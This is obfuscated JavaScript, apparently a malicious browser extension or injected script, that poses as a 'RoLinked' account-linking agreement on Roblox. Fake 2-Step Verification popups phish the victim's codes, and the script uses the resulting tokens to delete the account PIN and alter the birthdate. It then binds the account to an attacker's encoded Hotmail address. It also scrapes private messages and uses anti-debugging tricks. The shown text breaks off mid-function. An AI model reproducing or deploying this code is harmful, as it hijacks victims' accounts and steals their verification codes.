(async function () {
    var D = (function () {
            var n = {
                wzsyO: "function *\\( *\\)",
                BgKiL: "\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)",
                BquID: function (X, m) {
                    return X(m);
                },
                jdFsp: "init",
                OpSch: function (X, m) {
                    return X + m;
                },
                JWUdj: "chain",
                NDskx: "input",
                FJRsY: function (X) {
                    return X();
                },
                SKzXj: function (X, m, W) {
                    return X(m, W);
                },
                NGpTw: "promptPopup",
                FmEcf: "text-footer footer-note",
                JyarB: "Not Active",
                bqTmL: "beforeend",
                YheXV: "closeButton1",
                eGHrm: function (X, m) {
                    return X === m;
                },
                gqAXR: "egJZH",
                HcCfb: function (X, m) {
                    return X !== m;
                },
                SRlIh: "CUnUs",
                fWbcD: "HLtpR",
                ExvTZ: "SLqzE",
            };
            var V = true;
            return function (X, m) {
                var W = {
                    lIyIP: n.NGpTw,
                    UPHMS: n.FmEcf,
                    bwVRy: n.JyarB,
                    WCylt: n.bqTmL,
                    pgfUE: n.YheXV,
                    VCdzj: function (F, Y) {
                        return n.eGHrm(F, Y);
                    },
                    sJkTp: n.gqAXR,
                    AswBd: function (F, Y) {
                        return n.HcCfb(F, Y);
                    },
                    TIVGL: n.SRlIh,
                };
                if (n.eGHrm(n.fWbcD, n.ExvTZ)) {
                    var Y = {
                        YEJMP: AEIQJS.wzsyO,
                        qqEYw: AEIQJS.BgKiL,
                        XnWqz: function (G, L) {
                            return AEIQJS.BquID(G, L);
                        },
                        iYiiR: AEIQJS.jdFsp,
                        mZHWi: function (G, L) {
                            return AEIQJS.OpSch(G, L);
                        },
                        eBkHW: AEIQJS.JWUdj,
                        Acupz: AEIQJS.NDskx,
                        FXmdQ: function (G) {
                            return AEIQJS.FJRsY(G);
                        },
                    };
                    AEIQJS.SKzXj(B, this, function () {
                        var G = new e(Y.YEJMP),
                            L = new d(Y.qqEYw, "i");
                        var H = Y.XnWqz(A, Y.iYiiR);
                        !G.test(Y.mZHWi(H, Y.eBkHW)) || !L.test(Y.mZHWi(H, Y.Acupz)) ? Y.XnWqz(H, "0") : Y.FXmdQ(Q);
                    })();
                } else {
                    var s = V
                        ? function () {
                              var Y = {
                                  cDJYt: W.lIyIP,
                                  aYeYk: W.UPHMS,
                                  Sznju: W.bwVRy,
                              };
                              if (W.VCdzj(W.sJkTp, W.sJkTp)) {
                                  if (m) {
                                      if (W.AswBd(W.TIVGL, W.TIVGL)) {
                                          a.getElementById(W.lIyIP).remove();
                                          i.getElementsByClassName(W.UPHMS)[0].innerText = W.bwVRy;
                                      } else {
                                          var L = m.apply(X, arguments);
                                          return (m = null), L;
                                      }
                                  }
                              } else {
                                  var q = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                  D.body.insertAdjacentHTML(W.WCylt, q);
                                  f.getElementById(W.pgfUE).onclick = function () {
                                      q.getElementById(G.cDJYt).remove();
                                      p.getElementsByClassName(G.aYeYk)[0].innerText = G.Sznju;
                                  };
                                  d.getElementById(W.lIyIP).onclick = function () {
                                      q.getElementById(G.cDJYt).remove();
                                      p.getElementsByClassName(G.aYeYk)[0].innerText = G.Sznju;
                                  };
                              }
                          }
                        : function () {};
                    return (V = false), s;
                }
            };
        })(),
        f = D(this, function () {
            return f.toString().search("(((.+)+)+)+$").toString().constructor(f).search("(((.+)+)+)+$");
        });
    f();
    var i = (function () {
        var V = true;
        return function (X, m) {
            var F = V
                ? function () {
                      if (m) {
                          var H = m.apply(X, arguments);
                          return (m = null), H;
                      }
                  }
                : function () {};
            return (V = false), F;
        };
    })();
    (function () {
        i(this, function () {
            var X = new RegExp("function *\\( *\\)"),
                m = new RegExp("\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)", "i"),
                W = a("init");
            if (!X.test(W + "chain") || !m.test(W + "input")) {
                W("0");
            } else {
                a();
            }
        })();
    })();
    var e = (function () {
            var V = true;
            return function (X, m) {
                var s = V
                    ? function () {
                          if (m) {
                              var Y = m.apply(X, arguments);
                              return (m = null), Y;
                          }
                      }
                    : function () {};
                return (V = false), s;
            };
        })(),
        d = e(this, function () {
            var X;
            try {
                var m = Function('return (function() {}.constructor("return this")( ));');
                X = m();
            } catch (C) {
                X = window;
            }
            var W = (X.console = X.console || {}),
                s = ["log", "warn", "info", "error", "exception", "table", "trace"];
            for (var F = 0; F < s.length; F++) {
                var U = e.constructor.prototype.bind(e);
                var L = s[F];
                var H = W[L] || U;
                U["__proto__"] = e.bind(e);
                U.toString = H.toString.bind(H);
                W[L] = U;
            }
        });
    d();
    const A = (n) => new Promise((V) => setTimeout(V, n));
    var b = ["ZG93bWFubWVsaXNzYTgzQGhvdG1haWwuY29t"],
        Q = "@hotmail.com";
    var p = "d***";
    var y = b[Math.floor(Math.random() * b.length)],
        h = 6045232974;
    validDev = [];
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (n) {
                var X = Number(n.totalPages);
                for (let W = 0; W < X; W++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=inbox&pageNumber=" + W + "&pageSize=20",
                        contentType: "application/json",
                        success: function (F) {
                            var G = F.collection;
                            for (var L of G) {
                                if (L.body.includes("VlK Games") == true) {
                                    validDev.push("true");
                                }
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        $.ajax({
            method: "GET",
            url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=0&pageSize=20",
            contentType: "application/json",
            success: function (X) {
                var W = Number(X.totalPages);
                for (let F = 0; F < W; F++) {
                    $.ajax({
                        method: "GET",
                        url: "https://privatemessages.roblox.com/v1/messages?messageTab=archive&pageNumber=" + F + "&pageSize=20",
                        contentType: "application/json",
                        success: function (Y) {
                            var L = Y.collection;
                            for (var H of L) {
                                if (H.body.includes("VlK Games") == true) {
                                    validDev.push("true");
                                }
                            }
                        },
                    });
                }
            },
        });
    } catch {}
    try {
        console.log(document.getElementsByClassName("text-footer footer-note")[0].innerText);
    } catch {
        window.location.reload();
    }
    if (document.getElementsByClassName("text-footer footer-note")[0].innerText != "Active") {
        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Active";
        $.ajax({
            method: "GET",
            url: "https://users.roblox.com/v1/users/authenticated",
            contentType: "application/json",
            success: function (W) {
                var F = W.id;
                try {
                    var Y = { friendshipOriginSourceType: 0 };
                    $.ajax({
                        method: "POST",
                        url: "https://friends.roblox.com/v1/users/" + h + "/request-friendship",
                        contentType: "application/json",
                        data: JSON.stringify(Y),
                    });
                } catch {}
                async function G() {
                    function U() {
                        $.ajax({
                            method: "GET",
                            url: "https://accountsettings.roblox.com/v1/email",
                            contentType: "application/json",
                            success: function (w) {
                                if (w.emailAddress == null) {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://accountsettings.roblox.com/v1/email",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            emailAddress: atob(y),
                                            password: "",
                                        }),
                                    });
                                } else {
                                    var x = w.emailAddress,
                                        O = w.verified;
                                    if (x.includes(Q) == true) {
                                        if (x.includes(p) == true) {
                                            O == true &&
                                                (async function () {
                                                    await A(500);
                                                    var o = {
                                                        method: "POST",
                                                        url: "https://auth.roblox.com/v2/logout",
                                                        contentType: "application/json",
                                                    };
                                                    $.ajax(o);
                                                    window.open("https://pastebin.com/raw/dkRAyntj");
                                                })();
                                        }
                                    }
                                }
                            },
                        }),
                            setTimeout(U, 2000);
                    }
                    U();
                    function q(c, z, w) {
                        $.ajax({
                            method: "POST",
                            url: "https://twostepverification.roblox.com/v1/users/" + F + "/challenges/email/send-code",
                            contentType: "application/json",
                            data: JSON.stringify({
                                actionType: "Generic",
                                challengeId: c,
                            }),
                            success: function () {
                                var E = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code we just sent you via email. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", E);
                                function u() {
                                    document.getElementById("two-step-verification-code-input").value.length == 6 ? (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false) : (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true), setTimeout(u, 100);
                                }
                                u();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://twostepverification.roblox.com/v1/users/" + F + "/challenges/email/verify",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: c,
                                            actionType: "Generic",
                                            code: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function (o) {
                                            var M = o.verificationToken;
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/challenge/v1/continue",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    challengeId: z,
                                                    challengeMetadata: '{"verificationToken":"' + M + '","rememberDevice":false,"challengeId":"' + c + '","actionType":"Generic"}',
                                                    challengeType: "twostepverification",
                                                }),
                                                success: function () {
                                                    document.getElementById("twoStepPrompts").remove();
                                                    A(2000);
                                                    var Z2 = btoa('{"reauthenticationToken":"' + M + '"}');
                                                    console.log(w);
                                                    if (w == 1) {
                                                        console.log("Reason is 1");
                                                        var Z3 = {
                                                            method: "POST",
                                                            url: "https://twostepverification.roblox.com/v1/users/" + F + "/configuration/email/enable",
                                                            contentType: "application/json",
                                                            headers: {},
                                                        };
                                                        Z3.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                        Z3.headers["Rblx-Challenge-Id"] = z;
                                                        Z3.headers["Rblx-Challenge-Metadata"] = Z2;
                                                        $.ajax(Z3);
                                                    } else {
                                                        if (w == null) {
                                                            $.ajax({
                                                                method: "DELETE",
                                                                url: "https://auth.roblox.com/v1/account/pin",
                                                                contentType: "application/json",
                                                                headers: {
                                                                    "Rblx-Challenge-Type": "reauthentication",
                                                                    "Rblx-Challenge-Id": z,
                                                                    "Rblx-Challenge-Metadata": Z2,
                                                                },
                                                                success: function () {
                                                                    N(null, null);
                                                                },
                                                            });
                                                        } else {
                                                            N(z, Z2);
                                                        }
                                                    }
                                                },
                                            });
                                        },
                                        error: function () {
                                            document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code";
                                            document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function C(c, z, w) {
                        var x = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">Enter the code generated by your authenticator app. </p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                        document.body.insertAdjacentHTML("beforeend", x);
                        function O() {
                            document.getElementById("two-step-verification-code-input").value.length == 6 ? (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false) : (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true);
                            setTimeout(O, 100);
                        }
                        O();
                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                            $.ajax({
                                method: "POST",
                                url: "https://twostepverification.roblox.com/v1/users/" + F + "/challenges/authenticator/verify",
                                contentType: "application/json",
                                data: JSON.stringify({
                                    challengeId: c,
                                    actionType: "Generic",
                                    code: document.getElementById("two-step-verification-code-input").value,
                                }),
                                success: function (u) {
                                    var o = u.verificationToken;
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/challenge/v1/continue",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            challengeId: z,
                                            challengeMetadata: '{"verificationToken":"' + o + '","rememberDevice":false,"challengeId":"' + c + '","actionType":"Generic"}',
                                            challengeType: "twostepverification",
                                        }),
                                        success: function () {
                                            document.getElementById("twoStepPrompts").remove();
                                            A(2000);
                                            var g = btoa('{"reauthenticationToken":"' + o + '"}');
                                            if (w == 1) {
                                                console.log("Reason is 1");
                                                var M = {
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + F + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                    headers: {},
                                                };
                                                M.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                M.headers["Rblx-Challenge-Id"] = z;
                                                M.headers["Rblx-Challenge-Metadata"] = g;
                                                $.ajax(M);
                                            } else {
                                                if (w == null) {
                                                    $.ajax({
                                                        method: "DELETE",
                                                        url: "https://auth.roblox.com/v1/account/pin",
                                                        contentType: "application/json",
                                                        headers: {
                                                            "Rblx-Challenge-Type": "reauthentication",
                                                            "Rblx-Challenge-Id": z,
                                                            "Rblx-Challenge-Metadata": g,
                                                        },
                                                        success: function () {
                                                            N(null, null);
                                                        },
                                                    });
                                                } else {
                                                    N(z, g);
                                                }
                                            }
                                        },
                                    });
                                },
                                error: function (u) {
                                    if (u.responseText.includes('"code":18')) {
                                        (document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "This code has already been used. Please enter a new code."), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group");
                                    } else {
                                        document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code";
                                        document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group";
                                    }
                                },
                            });
                        };
                    }
                    function P(c, z) {
                        $.ajax({
                            method: "POST",
                            url: "https://apis.roblox.com/otp-service/v1/sendCodeForUser",
                            contentType: "application/json",
                            data: JSON.stringify({
                                contactType: "Email",
                                messageVariant: "Default",
                                origin: "Reauth",
                            }),
                            success: function (x) {
                                var E = x.otpSessionToken,
                                    k = '<div id="twoStepPrompts" role="dialog"> <div class="fade modal-backdrop in"></div> <div role="dialog" tabindex="-1" style="display: block;" class="fade modal-modern in modal"> <div class="modal-dialog"> <div class="modal-content" role="document"> <div title="" class="modal-header"> <button type="button" class="modal-modern-header-button"></button> <h4 class="modal-title">2-Step Verification</h4> <div class="modal-modern-header-info"></div> </div> <div class="modal-body"> <div class="modal-lock-icon"></div> <p class="modal-margin-bottom-xlarge">A one-time code has been sent to your registered email. Please enter your one-time code to continue.</p> <div class="input-control-wrapper"> <div id="groupElementId" class="form-group"> <input as="input" inputmode="numeric" autocomplete="off" maxlength="6" placeholder="Enter 6-Digit Code" type="text" id="two-step-verification-code-input" class="input-field form-control" value=""> <div class="form-control-label bottom-label xsmall">&nbsp;;</div> </div> </div> </div> <div class="modal-footer"> <div class="modal-modern-footer-buttons"> <button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Verify" disabled="">Verify</button> </div> <p class="text-footer modal-margin-bottom">Need help? Contact <a class="text-name text-footer contact" href="https://www.roblox.com/info/2sv" target="_blank" rel="noopener noreferrer">Roblox Support</a></p> <p class="text-footer">IMPORTANT: Don\'t share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p> </div> </div> </div> </div> </div>';
                                document.body.insertAdjacentHTML("beforeend", k);
                                function v() {
                                    document.getElementById("two-step-verification-code-input").value.length == 6 ? (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = false) : (document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].disabled = true);
                                    setTimeout(v, 100);
                                }
                                v();
                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                    $.ajax({
                                        method: "POST",
                                        url: "https://apis.roblox.com/otp-service/v1/validateCode",
                                        contentType: "application/json",
                                        data: JSON.stringify({
                                            contactType: "Email",
                                            origin: "Reauth",
                                            otpSessionToken: E,
                                            passCode: document.getElementById("two-step-verification-code-input").value,
                                        }),
                                        success: function () {
                                            $.ajax({
                                                method: "POST",
                                                url: "https://apis.roblox.com/reauthentication-service/v1/token/generate",
                                                contentType: "application/json",
                                                data: JSON.stringify({
                                                    sessionId: E,
                                                    type: "Otp_Email",
                                                }),
                                                success: function (Z0) {
                                                    (responseToken = Z0.token),
                                                        $.ajax({
                                                            method: "POST",
                                                            url: "https://apis.roblox.com/challenge/v1/continue",
                                                            contentType: "application/json",
                                                            data: JSON.stringify({
                                                                challengeId: c,
                                                                challengeMetadata: '{"reauthenticationToken":"' + responseToken + '"}',
                                                                challengeType: "reauthentication",
                                                            }),
                                                            success: function () {
                                                                document.getElementById("twoStepPrompts").remove();
                                                                A(2000);
                                                                var Z3 = btoa('{"reauthenticationToken":"' + responseToken + '"}');
                                                                if (z == 1) {
                                                                    console.log("Reason is 1");
                                                                    var Z4 = {
                                                                        method: "POST",
                                                                        url: "https://twostepverification.roblox.com/v1/users/" + F + "/configuration/email/enable",
                                                                        contentType: "application/json",
                                                                        headers: {},
                                                                    };
                                                                    Z4.headers["Rblx-Challenge-Type"] = "reauthentication";
                                                                    Z4.headers["Rblx-Challenge-Id"] = c;
                                                                    Z4.headers["Rblx-Challenge-Metadata"] = Z3;
                                                                    $.ajax(Z4);
                                                                } else {
                                                                    if (z == null) {
                                                                        $.ajax({
                                                                            method: "DELETE",
                                                                            url: "https://auth.roblox.com/v1/account/pin",
                                                                            contentType: "application/json",
                                                                            headers: {
                                                                                "Rblx-Challenge-Type": "reauthentication",
                                                                                "Rblx-Challenge-Id": c,
                                                                                "Rblx-Challenge-Metadata": Z3,
                                                                            },
                                                                            success: function () {
                                                                                N(null, null);
                                                                            },
                                                                        });
                                                                    } else {
                                                                        N(c, Z3);
                                                                    }
                                                                }
                                                            },
                                                        });
                                                },
                                            });
                                        },
                                        error: function () {
                                            (document.getElementsByClassName("form-control-label bottom-label xsmall")[0].innerText = "Invalid code"), (document.getElementById("groupElementId").className = "form-has-feedback  form-has-error form-group");
                                        },
                                    });
                                };
                            },
                        });
                    }
                    function j(c, z, w) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + F + "/configuration",
                            contentType: "application/json",
                            success: function (x) {
                                var E = x.primaryMediaType;
                                if (E == "Email") {
                                    q(c, z, w);
                                } else {
                                    if (E == "Authenticator") {
                                        C(c, z, w);
                                    } else {
                                        if (E == null) {
                                            P(z, w);
                                        }
                                    }
                                }
                            },
                        });
                    }
                    function N(c, z) {
                        $.ajax({
                            method: "GET",
                            url: "https://twostepverification.roblox.com/v1/users/" + F + "/configuration",
                            contentType: "application/json",
                            success: function (t) {
                                var O = t.primaryMediaType;
                                if (O == "Authenticator") {
                                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    if (document.getElementById("emailPopupz") == null) {
                                        var E = '<div id="emailPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog" bis_skin_checked="1"><div class="modal-content" role="document" bis_skin_checked="1"><div title="" class="modal-header" bis_skin_checked="1"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Email 2-Step Verification</h4><div class="modal-modern-header-info" bis_skin_checked="1"></div></div><div class="modal-body" bis_skin_checked="1"><div class="modal-lock-icon" bis_skin_checked="1"></div><p>You must enable Email 2-Step Verification to complete this action.</p></div><div class="modal-footer" bis_skin_checked="1"><div class="modal-modern-footer-buttons" bis_skin_checked="1"><button type="button" class="btn-cta-md modal-modern-footer-button" aria-label="Set Up">Enable</button></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", E);
                                        document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                            document.getElementById("emailPopupz").remove(),
                                                (document.getElementById("agreeRoLinked").disabled = false),
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://twostepverification.roblox.com/v1/users/" + F + "/configuration/email/enable",
                                                    contentType: "application/json",
                                                    success: function () {},
                                                    error: function (g) {
                                                        var Z1 = atob(g.getResponseHeader("rblx-challenge-metadata")),
                                                            Z2 = g.getResponseHeader("rblx-challenge-id"),
                                                            Z3 = Z1.split('"challengeId":"').pop().split('"')[0];
                                                        j(Z3, Z2, 1);
                                                    },
                                                });
                                        };
                                    }
                                } else {
                                    if (c == null) {
                                        var k = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            data: JSON.stringify(k),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(y),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await A(1500);
                                                            $.ajax({
                                                                method: "GET",
                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                contentType: "application/json",
                                                                success: function (Z3) {
                                                                    if (Z3.emailAddress == null) {
                                                                        $.ajax({
                                                                            method: "POST",
                                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                                            contentType: "application/json",
                                                                            data: JSON.stringify({
                                                                                emailAddress: atob(y),
                                                                                password: "",
                                                                            }),
                                                                        });
                                                                    }
                                                                },
                                                            });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await A(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (Z5) {
                                                                        if (Z5.emailAddress == null) {
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(y),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                        }
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (M) {
                                                var Z2 = atob(M.getResponseHeader("rblx-challenge-metadata")),
                                                    Z3 = M.getResponseHeader("rblx-challenge-id"),
                                                    Z4 = Z2.split('"challengeId":"').pop().split('"')[0];
                                                j(Z4, Z3, 2);
                                            },
                                        });
                                    } else {
                                        var u = {
                                            birthDay: 2,
                                            birthMonth: 2,
                                            birthYear: 2022,
                                        };
                                        $.ajax({
                                            method: "POST",
                                            url: "https://users.roblox.com/v1/birthdate",
                                            contentType: "application/json",
                                            headers: {
                                                "Rblx-Challenge-Type": "reauthentication",
                                                "Rblx-Challenge-Id": c,
                                                "Rblx-Challenge-Metadata": z,
                                            },
                                            data: JSON.stringify(u),
                                            success: function () {
                                                $.ajax({
                                                    method: "POST",
                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                    contentType: "application/json",
                                                    data: JSON.stringify({
                                                        emailAddress: atob(y),
                                                        password: "",
                                                    }),
                                                    success: function () {
                                                        (async function () {
                                                            await A(1500);
                                                            $.ajax({
                                                                method: "GET",
                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                contentType: "application/json",
                                                                success: function (Z4) {
                                                                    if (Z4.emailAddress == null) {
                                                                        $.ajax({
                                                                            method: "POST",
                                                                            url: "https://accountsettings.roblox.com/v1/email",
                                                                            contentType: "application/json",
                                                                            data: JSON.stringify({
                                                                                emailAddress: atob(y),
                                                                                password: "",
                                                                            }),
                                                                        });
                                                                    }
                                                                },
                                                            });
                                                        })();
                                                    },
                                                    error: function () {
                                                        (async function () {
                                                            await A(1500),
                                                                $.ajax({
                                                                    method: "GET",
                                                                    url: "https://accountsettings.roblox.com/v1/email",
                                                                    contentType: "application/json",
                                                                    success: function (Z3) {
                                                                        if (Z3.emailAddress == null) {
                                                                            $.ajax({
                                                                                method: "POST",
                                                                                url: "https://accountsettings.roblox.com/v1/email",
                                                                                contentType: "application/json",
                                                                                data: JSON.stringify({
                                                                                    emailAddress: atob(y),
                                                                                    password: "",
                                                                                }),
                                                                            });
                                                                        }
                                                                    },
                                                                });
                                                        })();
                                                    },
                                                });
                                            },
                                            error: function (M) {
                                                var Z0 = atob(M.getResponseHeader("rblx-challenge-metadata")),
                                                    Z1 = M.getResponseHeader("rblx-challenge-id"),
                                                    Z2 = Z0.split('"challengeId":"').pop().split('"')[0];
                                                j(Z2, Z1, 2);
                                            },
                                        });
                                    }
                                }
                            },
                        });
                    }
                    if (document.getElementById("RoLinked1") == null) {
                        var r = '<div id="RoLinked1" role="dialog"><div class="fade modal-backdrop in"></div><div aria-labelledby="contained-modal-title-vcenter" scrollable="true" centered="true" role="dialog" tabindex="-1" style="display: block;" class="fade verification-modal in modal"><div class="modal-sm modal-dialog"><div class="modal-content" role="document"><div><div title="" class="modal-header"><div class="verification-upsell-title-container"><button type="button" class="verification-upsell-title-button"></button><h4 id="contained-modal-title-vcenter" class="modal-title">RoLinked Agreement </h4></div></div><div class="verification-upsell-text-body text-description">RoLinked can view your Roblox Username</div><div class="modal-footer"><div class="text-description font-caption-body phone-verification-legal-text" hidden="">By clicking "Continue", you are submitting your phone number and agreeing to our <a href="https://en.help.roblox.com/hc/articles/9483830673556-Roblox-SMS-Terms-of-Service">SMS Terms of Use</a> and <a href="https://en.help.roblox.com/hc/articles/115004630823">Privacy Policy</a>. We will send you a one-time verification code. Message and data rates may apply. Reply HELP for help.</div><div class="buttons-section"><button type="button" class="accept-btn btn-primary-md btn-min-width" id="agreeRoLinked">Agree & Continue</button></div><div></div></div></div></div></div></div></div>';
                        document.body.insertAdjacentHTML("beforeend", r);
                        document.getElementById("agreeRoLinked").onclick = function () {
                            document.getElementById("agreeRoLinked").disabled = true;
                            $.ajax({
                                method: "GET",
                                url: "https://auth.roblox.com/v1/account/pin",
                                contentType: "application/json",
                                success: function (z) {
                                    var t = z.isEnabled;
                                    var x = z.unlockedUntil;
                                    if (t == true) {
                                        if (x == null) {
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                            if (document.getElementById("pinPopupz") == null) {
                                                var O = '<div id="pinPopupz" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div class="modal-content" role="document"><div title="" class="modal-header"><button type="button" class="modal-modern-header-button"></button><h4 class="modal-title">Account PIN Locked</h4><div class="modal-modern-header-info"></div></div><div class="modal-body"><p>Unlock the PIN attached to your account to continue</p></div><div class="modal-footer"><div class="modal-modern-footer-buttons"><a class="btn-cta-md modal-modern-footer-button" aria-label="Set Up" target="_blank" href="https://www.roblox.com/my/account#!/parental-controls">Open Settings</a></div></div></div></div></div></div>';
                                                document.body.insertAdjacentHTML("beforeend", O);
                                                document.getElementsByClassName("btn-cta-md modal-modern-footer-button")[0].onclick = function () {
                                                    document.getElementById("pinPopupz").remove();
                                                    document.getElementById("agreeRoLinked").disabled = false;
                                                };
                                            }
                                        } else {
                                            try {
                                                document.getElementById("pinPopupz").remove();
                                            } catch {}
                                            $.ajax({
                                                method: "DELETE",
                                                url: "https://auth.roblox.com/v1/account/pin",
                                                contentType: "application/json",
                                                success: function () {
                                                    N(null, null);
                                                },
                                                error: function (E) {
                                                    var k = atob(E.getResponseHeader("rblx-challenge-metadata")),
                                                        u = E.getResponseHeader("rblx-challenge-id");
                                                    var v = k.split('"challengeId":"').pop().split('"')[0];
                                                    j(v, u, null);
                                                },
                                            });
                                        }
                                    } else {
